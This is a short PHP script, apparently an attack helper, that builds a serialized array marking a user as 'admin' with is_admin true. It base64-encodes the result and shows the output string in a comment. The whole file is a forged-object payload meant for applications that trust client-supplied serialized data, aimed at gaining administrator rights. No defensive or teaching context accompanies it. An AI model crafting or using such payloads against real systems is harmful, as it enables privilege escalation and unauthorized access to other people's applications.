<?php
// generate_payload.php
$data = ['name' => 'test', 'role' => 'admin', 'is_admin' => true];
echo base64_encode(serialize($data));
// Output: YTozOntzOjQ6Im5hbWUiO3M6NDoidGVzdCI7czo0OiJyb2xlIjtzOjU6ImFkbWluIjtzOjg6ImlzX2FkbWluIjtiOjE7fQ==
?>